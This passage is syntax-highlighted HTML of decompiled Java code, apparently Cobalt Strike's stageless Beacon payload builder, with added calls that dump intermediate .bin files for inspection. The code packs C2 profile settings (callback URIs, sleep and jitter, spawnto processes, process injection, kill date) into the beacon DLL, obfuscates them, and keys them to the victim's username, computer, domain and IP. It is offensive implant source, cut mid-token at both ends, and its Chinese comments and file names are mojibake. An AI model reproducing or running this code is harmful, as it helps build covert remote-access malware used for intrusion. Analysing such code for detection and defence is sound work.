string">" |"</span><span class="token operator">+</span>var4<span class="token operator">+</span><span class="token string">" |"</span><span class="token operator">+</span>var5<span class="token operator">+</span><span class="token string">" |"</span><span class="token operator">+</span>var6<span class="token operator">+</span><span class="token string">" |"</span><span class="token operator">+</span>var7<span class="token operator">+</span><span class="token string">" |"</span><span class="token punctuation">)</span><span class="token punctuation">;</span><span class="token keyword">long</span> var8 <span class="token operator">=</span> <span class="token class-name">System</span><span class="token punctuation">.</span><span class="token function">currentTimeMillis</span><span class="token punctuation">(</span><span class="token punctuation">)</span><span class="token punctuation">;</span><span class="token keyword">byte</span><span class="token punctuation">[</span><span class="token punctuation">]</span> var10<span class="token operator">=</span> <span class="token class-name">SleevedResource</span><span class="token punctuation">.</span><span class="token function">readResource</span><span class="token punctuation">(</span>var5<span class="token punctuation">)</span><span class="token punctuation">;</span> <span class="token comment">//resources/beacon.x64.dll</span><span class="token class-name">CommonUtils</span><span class="token punctuation">.</span><span class="token function">writeByte</span><span class="token punctuation">(</span>var10<span class="token punctuation">,</span><span class="token string">"åŸæ¥çš„stagelessbeacon.x64.dll.bin"</span><span class="token punctuation">)</span><span class="token punctuation">;</span> <span class="token comment">//resources/beacon.x64.dll</span><span class="token comment">//resources/beacon.dll</span><span class="token comment">// sleeve/sleepmask.x86.o</span><span class="token class-name">String</span><span class="token punctuation">[</span><span class="token punctuation">]</span> var11 <span class="token operator">=</span> <span class="token keyword">this</span><span class="token punctuation">.</span>c2profile<span class="token punctuation">.</span><span class="token function">getString</span><span class="token punctuation">(</span><span class="token string">".http-get.uri"</span><span class="token punctuation">)</span><span class="token punctuation">.</span><span class="token function">split</span><span class="token punctuation">(</span><span class="token string">" "</span><span class="token punctuation">)</span><span class="token punctuation">;</span><span class="token class-name">String</span><span class="token punctuation">[</span><span class="token punctuation">]</span> var12 <span class="token operator">=</span> var2<span class="token punctuation">.</span><span class="token function">split</span><span class="token punctuation">(</span><span class="token string">",\\s*"</span><span class="token punctuation">)</span><span class="token punctuation">;</span><span class="token class-name">LinkedList</span> var13 <span class="token operator">=</span> <span class="token keyword">new</span> <span class="token class-name">LinkedList</span><span class="token punctuation">(</span><span class="token punctuation">)</span><span class="token punctuation">;</span><span class="token keyword">for</span><span class="token punctuation">(</span><span class="token keyword">int</span> var14 <span class="token operator">=</span> <span class="token number">0</span><span class="token punctuation">;</span> var14 <span class="token operator">&lt;</span> var12<span class="token punctuation">.</span>length<span class="token punctuation">;</span> <span class="token operator">++</span>var14<span class="token punctuation">)</span> <span class="token punctuation">&#123;</span>var13<span class="token punctuation">.</span><span class="token function">add</span><span class="token punctuation">(</span>var12<span class="token punctuation">[</span>var14<span class="token punctuation">]</span><span class="token punctuation">)</span><span class="token punctuation">;</span>var13<span class="token punctuation">.</span><span class="token function">add</span><span class="token punctuation">(</span><span class="token class-name">CommonUtils</span><span class="token punctuation">.</span><span class="token function">pick</span><span class="token punctuation">(</span>var11<span class="token punctuation">)</span><span class="token punctuation">)</span><span class="token punctuation">;</span><span class="token punctuation">&#125;</span><span class="token class-name">String</span> var34 <span class="token operator">=</span> <span class="token keyword">this</span><span class="token punctuation">.</span>listener<span class="token punctuation">.</span><span class="token function">getStrategy</span><span class="token punctuation">(</span><span class="token punctuation">)</span><span class="token punctuation">;</span><span class="token keyword">int</span> var15 <span class="token operator">=</span> <span class="token class-name">BeaconConstants</span><span class="token punctuation">.</span><span class="token function">getStrategyID</span><span class="token punctuation">(</span>var34<span class="token punctuation">)</span><span class="token punctuation">;</span><span class="token keyword">if</span> <span class="token punctuation">(</span>var34<span class="token punctuation">.</span><span class="token function">startsWith</span><span class="token punctuation">(</span><span class="token string">"rotate"</span><span class="token punctuation">)</span> <span class="token operator">||</span> var34<span class="token punctuation">.</span><span class="token function">startsWith</span><span class="token punctuation">(</span><span class="token string">"failover"</span><span class="token punctuation">)</span><span class="token punctuation">)</span> <span class="token punctuation">&#123;</span>var15 <span class="token operator">=</span> <span class="token number">2</span><span class="token punctuation">;</span><span class="token punctuation">&#125;</span><span class="token keyword">int</span> var16 <span class="token operator">=</span> <span class="token operator">-</span><span class="token number">1</span><span class="token punctuation">;</span><span class="token keyword">if</span> <span class="token punctuation">(</span>var34<span class="token punctuation">.</span><span class="token function">startsWith</span><span class="token punctuation">(</span><span class="token string">"rotate"</span><span class="token punctuation">)</span><span class="token punctuation">)</span> <span class="token punctuation">&#123;</span>var16 <span class="token operator">=</span> <span class="token class-name">BeaconConstants</span><span class="token punctuation">.</span><span class="token function">parseStrategyForNumber</span><span class="token punctuation">(</span>var34<span class="token punctuation">,</span> <span class="token string">"rotate"</span><span class="token punctuation">)</span><span class="token punctuation">;</span><span class="token punctuation">&#125;</span><span class="token keyword">int</span> var17 <span class="token operator">=</span> <span class="token operator">-</span><span class="token number">1</span><span class="token punctuation">;</span><span class="token keyword">if</span> <span class="token punctuation">(</span>var34<span class="token punctuation">.</span><span class="token function">equals</span><span class="token punctuation">(</span><span class="token string">"failover"</span><span class="token punctuation">)</span><span class="token punctuation">)</span> <span class="token punctuation">&#123;</span>var17 <span class="token operator">=</span> <span class="token number">0</span><span class="token punctuation">;</span><span class="token punctuation">&#125;</span> <span class="token keyword">else</span> <span class="token keyword">if</span> <span class="token punctuation">(</span>var34<span class="token punctuation">.</span><span class="token function">startsWith</span><span class="token punctuation">(</span><span class="token string">"failover"</span><span class="token punctuation">)</span> <span class="token operator">&amp;&amp;</span> var34<span class="token punctuation">.</span><span class="token function">endsWith</span><span class="token punctuation">(</span><span class="token string">"x"</span><span class="token punctuation">)</span><span class="token punctuation">)</span> <span class="token punctuation">&#123;</span>var17 <span class="token operator">=</span> <span class="token class-name">BeaconConstants</span><span class="token punctuation">.</span><span class="token function">parseStrategyForNumber</span><span class="token punctuation">(</span>var34<span class="token punctuation">,</span> <span class="token string">"failover"</span><span class="token punctuation">)</span><span class="token punctuation">;</span><span class="token punctuation">&#125;</span><span class="token keyword">int</span> var18 <span class="token operator">=</span> <span class="token operator">-</span><span class="token number">1</span><span class="token punctuation">;</span><span class="token keyword">if</span> <span class="token punctuation">(</span>var34<span class="token punctuation">.</span><span class="token function">startsWith</span><span class="token punctuation">(</span><span class="token string">"failover"</span><span class="token punctuation">)</span> <span class="token operator">&amp;&amp;</span> <span class="token punctuation">(</span>var34<span class="token punctuation">.</span><span class="token function">endsWith</span><span class="token punctuation">(</span><span class="token string">"s"</span><span class="token punctuation">)</span> <span class="token operator">||</span> var34<span class="token punctuation">.</span><span class="token function">endsWith</span><span class="token punctuation">(</span><span class="token string">"m"</span><span class="token punctuation">)</span> <span class="token operator">||</span> var34<span class="token punctuation">.</span><span class="token function">endsWith</span><span class="token punctuation">(</span><span class="token string">"h"</span><span class="token punctuation">)</span> <span class="token operator">||</span> var34<span class="token punctuation">.</span><span class="token function">endsWith</span><span class="token punctuation">(</span><span class="token string">"d"</span><span class="token punctuation">)</span><span class="token punctuation">)</span><span class="token punctuation">)</span> <span class="token punctuation">&#123;</span>var18 <span class="token operator">=</span> <span class="token class-name">BeaconConstants</span><span class="token punctuation">.</span><span class="token function">parseStrategyForNumber</span><span class="token punctuation">(</span>var34<span class="token punctuation">,</span> <span class="token string">"failover"</span><span class="token punctuation">)</span><span class="token punctuation">;</span><span class="token punctuation">&#125;</span><span class="token keyword">while</span><span class="token punctuation">(</span>var13<span class="token punctuation">.</span><span class="token function">size</span><span class="token punctuation">(</span><span class="token punctuation">)</span> <span class="token operator">></span> <span class="token number">2</span> <span class="token operator">&amp;&amp;</span> <span class="token class-name">CommonUtils</span><span class="token punctuation">.</span><span class="token function">join</span><span class="token punctuation">(</span><span class="token punctuation">(</span><span class="token class-name">Collection</span><span class="token punctuation">)</span>var13<span class="token punctuation">,</span> <span class="token punctuation">(</span><span class="token class-name">String</span><span class="token punctuation">)</span><span class="token string">","</span><span class="token punctuation">)</span><span class="token punctuation">.</span><span class="token function">length</span><span class="token punctuation">(</span><span class="token punctuation">)</span> <span class="token operator">></span> <span class="token number">255</span><span class="token punctuation">)</span> <span class="token punctuation">&#123;</span><span class="token class-name">String</span> var19 <span class="token operator">=</span> var13<span class="token punctuation">.</span><span class="token function">removeLast</span><span class="token punctuation">(</span><span class="token punctuation">)</span> <span class="token operator">+</span> <span class="token string">""</span><span class="token punctuation">;</span><span class="token class-name">String</span> var20 <span class="token operator">=</span> var13<span class="token punctuation">.</span><span class="token function">removeLast</span><span class="token punctuation">(</span><span class="token punctuation">)</span> <span class="token operator">+</span> <span class="token string">""</span><span class="token punctuation">;</span><span class="token class-name"><span class="token namespace">this<span class="token punctuation">.</span></span>F</span><span class="token punctuation">(</span><span class="token string">"dropping "</span> <span class="token operator">+</span> var20 <span class="token operator">+</span> var19 <span class="token operator">+</span> <span class="token string">" from Beacon profile for size"</span><span class="token punctuation">)</span><span class="token punctuation">;</span><span class="token punctuation">&#125;</span><span class="token class-name">Profile<span class="token punctuation">.</span>SleepAndJitter</span> var35 <span class="token operator">=</span> <span class="token keyword">this</span><span class="token punctuation">.</span>c2profile<span class="token punctuation">.</span><span class="token function">getSleep</span><span class="token punctuation">(</span><span class="token boolean">true</span><span class="token punctuation">)</span><span class="token punctuation">;</span><span class="token keyword">int</span> var36 <span class="token operator">=</span> <span class="token keyword">this</span><span class="token punctuation">.</span>c2profile<span class="token punctuation">.</span><span class="token function">getInt</span><span class="token punctuation">(</span><span class="token string">".tasks_max_size"</span><span class="token punctuation">)</span><span class="token punctuation">;</span><span class="token keyword">int</span> var21 <span class="token operator">=</span> <span class="token keyword">this</span><span class="token punctuation">.</span>c2profile<span class="token punctuation">.</span><span class="token function">size</span><span class="token punctuation">(</span><span class="token string">".http-get.server.output"</span><span class="token punctuation">,</span> var36<span class="token punctuation">)</span><span class="token punctuation">;</span><span class="token keyword">int</span> var22 <span class="token operator">=</span> <span class="token number">0</span><span class="token punctuation">;</span><span class="token keyword">if</span> <span class="token punctuation">(</span>var3<span class="token punctuation">)</span> <span class="token punctuation">&#123;</span>var22 <span class="token operator">|=</span> <span class="token number">1</span><span class="token punctuation">;</span><span class="token punctuation">&#125;</span><span class="token keyword">if</span> <span class="token punctuation">(</span>var4<span class="token punctuation">)</span> <span class="token punctuation">&#123;</span>var22 <span class="token operator">|=</span> <span class="token number">8</span><span class="token punctuation">;</span><span class="token punctuation">&#125;</span><span class="token class-name">BeaconGuardrails</span> var23 <span class="token operator">=</span> <span class="token keyword">null</span><span class="token punctuation">;</span><span class="token keyword">if</span> <span class="token punctuation">(</span>var6 <span class="token operator">!=</span> <span class="token keyword">null</span><span class="token punctuation">)</span> <span class="token punctuation">&#123;</span>var23 <span class="token operator">=</span> <span class="token keyword">new</span> <span class="token class-name">BeaconGuardrails</span><span class="token punctuation">(</span>var6<span class="token punctuation">)</span><span class="token punctuation">;</span><span class="token punctuation">&#125;</span> <span class="token keyword">else</span> <span class="token punctuation">&#123;</span>var23 <span class="token operator">=</span> <span class="token keyword">new</span> <span class="token class-name">BeaconGuardrails</span><span class="token punctuation">(</span><span class="token keyword">this</span><span class="token punctuation">.</span>listener<span class="token punctuation">)</span><span class="token punctuation">;</span><span class="token punctuation">&#125;</span><span class="token class-name">Settings</span> var24 <span class="token operator">=</span> <span class="token keyword">new</span> <span class="token class-name">Settings</span><span class="token punctuation">(</span><span class="token number">6144</span><span class="token punctuation">)</span><span class="token punctuation">;</span>var24<span class="token punctuation">.</span><span class="token function">addShort</span><span class="token punctuation">(</span><span class="token number">1</span><span class="token punctuation">,</span> var22<span class="token punctuation">)</span><span class="token punctuation">;</span>var24<span class="token punctuation">.</span><span class="token function">addShort</span><span class="token punctuation">(</span><span class="token number">2</span><span class="token punctuation">,</span> var1<span class="token punctuation">)</span><span class="token punctuation">;</span>var24<span class="token punctuation">.</span><span class="token function">addInt</span><span class="token punctuation">(</span><span class="token number">3</span><span class="token punctuation">,</span> <span class="token class-name"><span class="token namespace">var35<span class="token punctuation">.</span></span>SleepInMilliseconds</span><span class="token punctuation">)</span><span class="token punctuation">;</span>var24<span class="token punctuation">.</span><span class="token function">addInt</span><span class="token punctuation">(</span><span class="token number">4</span><span class="token punctuation">,</span> var21<span class="token punctuation">)</span><span class="token punctuation">;</span>var24<span class="token punctuation">.</span><span class="token function">addShort</span><span class="token punctuation">(</span><span class="token number">5</span><span class="token punctuation">,</span> <span class="token class-name"><span class="token namespace">var35<span class="token punctuation">.</span></span>Jitter</span><span class="token punctuation">)</span><span class="token punctuation">;</span>var24<span class="token punctuation">.</span><span class="token function">addData</span><span class="token punctuation">(</span><span class="token number">7</span><span class="token punctuation">,</span> <span class="token keyword">this</span><span class="token punctuation">.</span>publickey<span class="token punctuation">,</span> <span class="token number">256</span><span class="token punctuation">)</span><span class="token punctuation">;</span>var24<span class="token punctuation">.</span><span class="token function">addString</span><span class="token punctuation">(</span><span class="token number">8</span><span class="token punctuation">,</span> <span class="token class-name">CommonUtils</span><span class="token punctuation">.</span><span class="token function">join</span><span class="token punctuation">(</span><span class="token punctuation">(</span><span class="token class-name">Collection</span><span class="token punctuation">)</span>var13<span class="token punctuation">,</span> <span class="token punctuation">(</span><span class="token class-name">String</span><span class="token punctuation">)</span><span class="token string">","</span><span class="token punctuation">)</span><span class="token punctuation">,</span> <span class="token number">256</span><span class="token punctuation">)</span><span class="token punctuation">;</span>var24<span class="token punctuation">.</span><span class="token function">addShort</span><span class="token punctuation">(</span><span class="token number">67</span><span class="token punctuation">,</span> var15<span class="token punctuation">)</span><span class="token punctuation">;</span>var24<span class="token punctuation">.</span><span class="token function">addInt</span><span class="token punctuation">(</span><span class="token number">68</span><span class="token punctuation">,</span> var16<span class="token punctuation">)</span><span class="token punctuation">;</span>var24<span class="token punctuation">.</span><span class="token function">addInt</span><span class="token punctuation">(</span><span class="token number">69</span><span class="token punctuation">,</span> var17<span class="token punctuation">)</span><span class="token punctuation">;</span>var24<span class="token punctuation">.</span><span class="token function">addInt</span><span class="token punctuation">(</span><span class="token number">70</span><span class="token punctuation">,</span> var18<span class="token punctuation">)</span><span class="token punctuation">;</span>var24<span class="token punctuation">.</span><span class="token function">addData</span><span class="token punctuation">(</span><span class="token number">14</span><span class="token punctuation">,</span> <span class="token class-name">CommonUtils</span><span class="token punctuation">.</span><span class="token function">asBinary</span><span class="token punctuation">(</span><span class="token keyword">this</span><span class="token punctuation">.</span>c2profile<span class="token punctuation">.</span><span class="token function">getString</span><span class="token punctuation">(</span><span class="token string">".spawnto"</span><span class="token punctuation">)</span><span class="token punctuation">)</span><span class="token punctuation">,</span> <span class="token number">16</span><span class="token punctuation">)</span><span class="token punctuation">;</span>var24<span class="token punctuation">.</span><span class="token function">addString</span><span class="token punctuation">(</span><span class="token number">29</span><span class="token punctuation">,</span> <span class="token keyword">this</span><span class="token punctuation">.</span>c2profile<span class="token punctuation">.</span><span class="token function">getString</span><span class="token punctuation">(</span><span class="token string">".post-ex.spawnto_x86"</span><span class="token punctuation">)</span><span class="token punctuation">,</span> <span class="token number">64</span><span class="token punctuation">)</span><span class="token punctuation">;</span>var24<span class="token punctuation">.</span><span class="token function">addString</span><span class="token punctuation">(</span><span class="token number">30</span><span class="token punctuation">,</span> <span class="token keyword">this</span><span class="token punctuation">.</span>c2profile<span class="token punctuation">.</span><span class="token function">getString</span><span class="token punctuation">(</span><span class="token string">".post-ex.spawnto_x64"</span><span class="token punctuation">)</span><span class="token punctuation">,</span> <span class="token number">64</span><span class="token punctuation">)</span><span class="token punctuation">;</span>var24<span class="token punctuation">.</span><span class="token function">addShort</span><span class="token punctuation">(</span><span class="token number">31</span><span class="token punctuation">,</span> <span class="token class-name">QuickSecurity</span><span class="token punctuation">.</span><span class="token function">getCryptoScheme</span><span class="token punctuation">(</span><span class="token punctuation">)</span><span class="token punctuation">)</span><span class="token punctuation">;</span>var24<span class="token punctuation">.</span><span class="token function">addString</span><span class="token punctuation">(</span><span class="token number">26</span><span class="token punctuation">,</span> <span class="token keyword">this</span><span class="token punctuation">.</span>c2profile<span class="token punctuation">.</span><span class="token function">getString</span><span class="token punctuation">(</span><span class="token string">".http-get.verb"</span><span class="token punctuation">)</span><span class="token punctuation">,</span> <span class="token number">16</span><span class="token punctuation">)</span><span class="token punctuation">;</span>var24<span class="token punctuation">.</span><span class="token function">addString</span><span class="token punctuation">(</span><span class="token number">27</span><span class="token punctuation">,</span> <span class="token keyword">this</span><span class="token punctuation">.</span>c2profile<span class="token punctuation">.</span><span class="token function">getString</span><span class="token punctuation">(</span><span class="token string">".http-post.verb"</span><span class="token punctuation">)</span><span class="token punctuation">,</span> <span class="token number">16</span><span class="token punctuation">)</span><span class="token punctuation">;</span>var24<span class="token punctuation">.</span><span class="token function">addInt</span><span class="token punctuation">(</span><span class="token number">28</span><span class="token punctuation">,</span> <span class="token keyword">this</span><span class="token punctuation">.</span>c2profile<span class="token punctuation">.</span><span class="token function">shouldChunkPosts</span><span class="token punctuation">(</span><span class="token punctuation">)</span> <span class="token operator">?</span> <span class="token number">96</span> <span class="token operator">:</span> <span class="token number">0</span><span class="token punctuation">)</span><span class="token punctuation">;</span>var24<span class="token punctuation">.</span><span class="token function">addInt</span><span class="token punctuation">(</span><span class="token number">37</span><span class="token punctuation">,</span> <span class="token keyword">this</span><span class="token punctuation">.</span>c2profile<span class="token punctuation">.</span><span class="token function">getInt</span><span class="token punctuation">(</span><span class="token string">".watermark"</span><span class="token punctuation">)</span><span class="token punctuation">)</span><span class="token punctuation">;</span>var24<span class="token punctuation">.</span><span class="token function">addString</span><span class="token punctuation">(</span><span class="token number">36</span><span class="token punctuation">,</span> <span class="token keyword">this</span><span class="token punctuation">.</span>c2profile<span class="token punctuation">.</span><span class="token function">getString</span><span class="token punctuation">(</span><span class="token string">".watermarkHash"</span><span class="token punctuation">)</span><span class="token punctuation">,</span> <span class="token number">32</span><span class="token punctuation">)</span><span class="token punctuation">;</span>var24<span class="token punctuation">.</span><span class="token function">addShort</span><span class="token punctuation">(</span><span class="token number">38</span><span class="token punctuation">,</span> <span class="token keyword">this</span><span class="token punctuation">.</span>c2profile<span class="token punctuation">.</span><span class="token function">option</span><span class="token punctuation">(</span><span class="token string">".stage.cleanup"</span><span class="token punctuation">)</span> <span class="token operator">?</span> <span class="token number">1</span> <span class="token operator">:</span> <span class="token number">0</span><span class="token punctuation">)</span><span class="token punctuation">;</span>var24<span class="token punctuation">.</span><span class="token function">addShort</span><span class="token punctuation">(</span><span class="token number">39</span><span class="token punctuation">,</span> <span class="token keyword">this</span><span class="token punctuation">.</span>c2profile<span class="token punctuation">.</span><span class="token function">exerciseCFGCaution</span><span class="token punctuation">(</span><span class="token punctuation">)</span> <span class="token operator">?</span> <span class="token number">1</span> <span class="token operator">:</span> <span class="token number">0</span><span class="token punctuation">)</span><span class="token punctuation">;</span>var24<span class="token punctuation">.</span><span class="token function">addInt</span><span class="token punctuation">(</span><span class="token number">76</span><span class="token punctuation">,</span> <span class="token keyword">this</span><span class="token punctuation">.</span>c2profile<span class="token punctuation">.</span><span class="token function">getInt</span><span class="token punctuation">(</span><span class="token string">".stage.data_store_size"</span><span class="token punctuation">)</span><span class="token punctuation">)</span><span class="token punctuation">;</span><span class="token keyword">this</span><span class="token punctuation">.</span><span class="token function">setupMaxRetryStrategy</span><span class="token punctuation">(</span>var24<span class="token punctuation">,</span> <span class="token keyword">this</span><span class="token punctuation">.</span>listener<span class="token punctuation">.</span><span class="token function">getMaxRetryStrategy</span><span class="token punctuation">(</span><span class="token punctuation">)</span><span class="token punctuation">)</span><span class="token punctuation">;</span><span class="token keyword">if</span> <span class="token punctuation">(</span>var3<span class="token punctuation">)</span> <span class="token punctuation">&#123;</span><span class="token keyword">this</span><span class="token punctuation">.</span><span class="token function">setupDNS</span><span class="token punctuation">(</span>var24<span class="token punctuation">)</span><span class="token punctuation">;</span><span class="token punctuation">&#125;</span> <span class="token keyword">else</span> <span class="token punctuation">&#123;</span><span class="token keyword">this</span><span class="token punctuation">.</span><span class="token function">setupHTTP</span><span class="token punctuation">(</span>var24<span class="token punctuation">,</span> var7<span class="token punctuation">,</span> var13<span class="token punctuation">)</span><span class="token punctuation">;</span><span class="token punctuation">&#125;</span><span class="token class-name">String</span> var25 <span class="token operator">=</span> <span class="token keyword">this</span><span class="token punctuation">.</span>listener<span class="token punctuation">.</span><span class="token function">getHostHeader</span><span class="token punctuation">(</span><span class="token punctuation">)</span><span class="token punctuation">;</span><span class="token keyword">if</span> <span class="token punctuation">(</span>var25 <span class="token operator">!=</span> <span class="token keyword">null</span> <span class="token operator">&amp;&amp;</span> var25<span class="token punctuation">.</span><span class="token function">length</span><span class="token punctuation">(</span><span class="token punctuation">)</span> <span class="token operator">!=</span> <span class="token number">0</span><span class="token punctuation">)</span> <span class="token punctuation">&#123;</span><span class="token keyword">if</span> <span class="token punctuation">(</span><span class="token class-name">Profile</span><span class="token punctuation">.</span><span class="token function">usesHostBeacon</span><span class="token punctuation">(</span><span class="token keyword">this</span><span class="token punctuation">.</span>c2profile<span class="token punctuation">)</span><span class="token punctuation">)</span> <span class="token punctuation">&#123;</span>var24<span class="token punctuation">.</span><span class="token function">addString</span><span class="token punctuation">(</span><span class="token number">54</span><span class="token punctuation">,</span> <span class="token string">""</span><span class="token punctuation">,</span> <span class="token number">128</span><span class="token punctuation">)</span><span class="token punctuation">;</span><span class="token punctuation">&#125;</span> <span class="token keyword">else</span> <span class="token punctuation">&#123;</span>var24<span class="token punctuation">.</span><span class="token function">addString</span><span class="token punctuation">(</span><span class="token number">54</span><span class="token punctuation">,</span> <span class="token string">"Host: "</span> <span class="token operator">+</span> <span class="token keyword">this</span><span class="token punctuation">.</span>listener<span class="token punctuation">.</span><span class="token function">getHostHeader</span><span class="token punctuation">(</span><span class="token punctuation">)</span> <span class="token operator">+</span> <span class="token string">"\r\n"</span><span class="token punctuation">,</span> <span class="token number">128</span><span class="token punctuation">)</span><span class="token punctuation">;</span><span class="token punctuation">&#125;</span><span class="token punctuation">&#125;</span> <span class="token keyword">else</span> <span class="token punctuation">&#123;</span>var24<span class="token punctuation">.</span><span class="token function">addString</span><span class="token punctuation">(</span><span class="token number">54</span><span class="token punctuation">,</span> <span class="token string">""</span><span class="token punctuation">,</span> <span class="token number">128</span><span class="token punctuation">)</span><span class="token punctuation">;</span><span class="token punctuation">&#125;</span><span class="token keyword">if</span> <span class="token punctuation">(</span><span class="token class-name">Profile</span><span class="token punctuation">.</span><span class="token function">usesCookieBeacon</span><span class="token punctuation">(</span><span class="token keyword">this</span><span class="token punctuation">.</span>c2profile<span class="token punctuation">)</span><span class="token punctuation">)</span> <span class="token punctuation">&#123;</span>var24<span class="token punctuation">.</span><span class="token function">addShort</span><span class="token punctuation">(</span><span class="token number">50</span><span class="token punctuation">,</span> <span class="token number">1</span><span class="token punctuation">)</span><span class="token punctuation">;</span><span class="token punctuation">&#125;</span> <span class="token keyword">else</span> <span class="token punctuation">&#123;</span>var24<span class="token punctuation">.</span><span class="token function">addShort</span><span class="token punctuation">(</span><span class="token number">50</span><span class="token punctuation">,</span> <span class="token number">0</span><span class="token punctuation">)</span><span class="token punctuation">;</span><span class="token punctuation">&#125;</span><span class="token class-name">ProxyServer</span> var26 <span class="token operator">=</span> <span class="token class-name">ProxyServer</span><span class="token punctuation">.</span><span class="token function">parse</span><span class="token punctuation">(</span><span class="token keyword">this</span><span class="token punctuation">.</span>listener<span class="token punctuation">.</span><span class="token function">getProxyString</span><span class="token punctuation">(</span><span class="token punctuation">)</span><span class="token punctuation">)</span><span class="token punctuation">;</span>var26<span class="token punctuation">.</span><span class="token function">setup</span><span class="token punctuation">(</span>var24<span class="token punctuation">)</span><span class="token punctuation">;</span><span class="token function">setupPivotFrames</span><span class="token punctuation">(</span><span class="token keyword">this</span><span class="token punctuation">.</span>c2profile<span class="token punctuation">,</span> var24<span class="token punctuation">)</span><span class="token punctuation">;</span><span class="token keyword">this</span><span class="token punctuation">.</span><span class="token function">setupKillDate</span><span class="token punctuation">(</span>var24<span class="token punctuation">)</span><span class="token punctuation">;</span><span class="token keyword">this</span><span class="token punctuation">.</span><span class="token function">setupGargle</span><span class="token punctuation">(</span>var24<span class="token punctuation">,</span> var5<span class="token punctuation">)</span><span class="token punctuation">;</span><span class="token punctuation">(</span><span class="token keyword">new</span> <span class="token class-name">ProcessInject</span><span class="token punctuation">(</span><span class="token keyword">this</span><span class="token punctuation">.</span>c2profile<span class="token punctuation">)</span><span class="token punctuation">)</span><span class="token punctuation">.</span><span class="token function">apply</span><span class="token punctuation">(</span>var24<span class="token punctuation">)</span><span class="token punctuation">;</span>var24<span class="token punctuation">.</span><span class="token function">addInt</span><span class="token punctuation">(</span><span class="token number">17</span><span class="token punctuation">,</span> <span class="token keyword">this</span><span class="token punctuation">.</span>syscallMethod<span class="token punctuation">)</span><span class="token punctuation">;</span><span class="token keyword">byte</span><span class="token punctuation">[</span><span class="token punctuation">]</span> var27 <span class="token operator">=</span> var24<span class="token punctuation">.</span><span class="token function">toPatch</span><span class="token punctuation">(</span><span class="token punctuation">)</span><span class="token punctuation">;</span><span class="token keyword">int</span> var28 <span class="token operator">=</span> <span class="token class-name">BeaconGuardrails</span><span class="token punctuation">.</span><span class="token function">quickChecksum</span><span class="token punctuation">(</span>var27<span class="token punctuation">)</span><span class="token punctuation">;</span>var23<span class="token punctuation">.</span><span class="token function">setPayloadChecksum</span><span class="token punctuation">(</span>var28 <span class="token operator">+</span> <span class="token number">1</span><span class="token punctuation">)</span><span class="token punctuation">;</span>var27 <span class="token operator">=</span> <span class="token function">beacon_obfuscate</span><span class="token punctuation">(</span>var27<span class="token punctuation">)</span><span class="token punctuation">;</span>var27 <span class="token operator">=</span> var23<span class="token punctuation">.</span><span class="token function">hashWithUsername</span><span class="token punctuation">(</span>var27<span class="token punctuation">)</span><span class="token punctuation">;</span>var27 <span class="token operator">=</span> var23<span class="token punctuation">.</span><span class="token function">hashWithComputer</span><span class="token punctuation">(</span>var27<span class="token punctuation">)</span><span class="token punctuation">;</span>var27 <span class="token operator">=</span> var23<span class="token punctuation">.</span><span class="token function">hashWithDomain</span><span class="token punctuation">(</span>var27<span class="token punctuation">)</span><span class="token punctuation">;</span>var27 <span class="token operator">=</span> var23<span class="token punctuation">.</span><span class="token function">hashWithLocalIP</span><span class="token punctuation">(</span>var27<span class="token punctuation">)</span><span class="token punctuation">;</span><span class="token class-name">String</span> var29 <span class="token operator">=</span> <span class="token class-name">CommonUtils</span><span class="token punctuation">.</span><span class="token function">bString</span><span class="token punctuation">(</span>var10<span class="token punctuation">)</span><span class="token punctuation">;</span><span class="token comment">//æŠŠdllå˜æˆå­—ç¬¦ä¸²</span><span class="token class-name">CommonUtils</span><span class="token punctuation">.</span><span class="token function">writeByte</span><span class="token punctuation">(</span>var10<span class="token punctuation">,</span><span class="token string">"stagelessbeacondllåŸæ¥çš„stagelessbeacon.x64.dll-Two.bin"</span><span class="token punctuation">)</span><span class="token punctuation">;</span><span class="token comment">// sleep mask</span>var29 <span class="token operator">=</span> <span class="token keyword">this</span><span class="token punctuation">.</span><span class="token function">patchSleepMaskString</span><span class="token punctuation">(</span>var29<span class="token punctuation">,</span> <span class="token string">"default"</span><span class="token punctuation">)</span><span class="token punctuation">;</span><span class="token class-name">CommonUtils</span><span class="token punctuation">.</span><span class="token function">writeByte</span><span class="token punctuation">(</span><span class="token class-name">CommonUtils</span><span class="token punctuation">.</span><span class="token function">toBytes</span><span class="token punctuation">(</span>var29<span class="token punctuation">)</span><span class="token punctuation">,</span><span class="token string">"stagelesssbeaconPatchSleepMask.x64.dll-Two.bin"</span><span class="token punctuation">)</span><span class="token punctuation">;</span><span class="token class-name">String</span> var30 <span class="token operator">=</span> <span class="token string">"AAAABBBBCCCCDDDDEEEEFFFF"</span><span class="token punctuation">;</span><span class="token keyword">int</span> var31 <span class="token operator">=</span> var29<span class="token punctuation">.</span><span class="token function">indexOf</span><span class="token punctuation">(</span>var30<span class="token punctuation">)</span><span class="token punctuation">;</span><span class="token keyword">if</span> <span class="token punctuation">(</span>var31 <span class="token operator">></span> <span class="token operator">-</span><span class="token number">1</span><span class="token punctuation">)</span> <span class="token punctuation">&#123;</span><span class="token class-name">String</span> var32 <span class="token operator">=</span> <span class="token class-name">CommonUtils</span><span class="token punctuation">.</span><span class="token function">bString</span><span class="token punctuation">(</span>var27<span class="token punctuation">)</span><span class="token punctuation">;</span>var29 <span class="token operator">=</span> <span class="token class-name">CommonUtils</span><span class="token punctuation">.</span><span class="token function">replaceAt</span><span class="token punctuation">(</span>var29<span class="token punctuation">,</span> var32<span class="token punctuation">,</span> var31<span class="token punctuation">)</span><span class="token punctuation">;</span><span class="token punctuation">&#125;</span><span class="token class-name">Settings</span> var37 <span class="token operator">=</span> var23<span class="token punctuation">.</span><span class="token function">buildGuardSettings</span><span class="token punctuation">(</span><span class="token punctuation">)</span><span class="token punctuation">;</span>var29 <span class="token operator">=</span> <span class="token class-name">BeaconGuardrails</span><span class="token punctuation">.</span><span class="token function">applyPatch</span><span class="token punctuation">(</span>var29<span class="token punctuation">,</span> var37<span class="token punctuation">,</span> var27<span class="token punctuation">)</span><span class="token punctuation">;</span><span class="token class-name">CommonUtils</span><span class="token punctuation">.</span><span class="token function">writeByte</span><span class="token punctuation">(</span><span class="token class-name">CommonUtils</span><span class="token punctuation">.</span><span class="token function">toBytes</span><span class="token punctuation">(</span>var29<span class="token punctuation">)</span><span class="token punctuation">,</span><span class="token string">"stagelesPathcEnd.bin"</span><span class="token punctuation">)</span><span class="token punctuation">;</span><span class="token keyword">return</span> <span class="token class-name">CommonUtils</span><span class="token punctuation">.</span><span class="token function">toBytes</span><span class="token punctuation">(</span>var29<span class="token punctuation">)</span><span class="token punctuation">;</span><span class="token punctuation">&#125;</span> <span class="token 